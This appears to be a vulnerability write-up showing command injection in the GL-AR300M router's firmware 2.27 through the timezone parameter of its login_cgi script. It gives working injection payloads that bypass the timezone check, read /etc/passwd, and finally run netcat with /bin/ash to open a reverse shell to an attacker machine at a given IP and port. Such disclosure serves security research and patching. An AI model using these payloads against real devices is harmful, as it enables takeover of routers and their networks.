## Preparation  

Product: GL-AR300M  

Firmware version: 2.27

## Command Injection  

### Hijack HTTP Request  

The first time we start the device and login the web interface. Let's set the language and the timezone.  

![](images/img1.jpg)

![](images/img2.jpg)

Using Fiddle tool to capture the HTTP request:  

![](images/img3.jpg)

When we perform this action the login_cgi script takes the content of the timezone parameter and inserts it into the /tmp/TZ file:

![](images/img4.jpg)

### Request Forgery  

If we try to insert a value not present in the list of timezones, the script blocks us:  

![](images/img6.png)

![](images/img7.png)

![](images/img5.jpg)

We can bypass this and write on TZ file what we want, using this payload:  

```  
|echo+TEST||a+#'+ ||a #
```

![](images/img8.jpg)

Replace the payload with:  

```  
|echo+TEST||a+#'+|echo `cat /etc/passwd` ||a #
```

![](images/img11.jpg)

So I can execute the command. On my remote machine, I am listening the port "12345" via `nc -lvp 12345`. Now, let's replace the payload with netcat. 

```  
nc 192.168.17.130:12345 -e /bin/ash
```

![](images/img9.jpg)

For now, I have got the router's shell on my remote machine.  

![](images/img10.jpg) 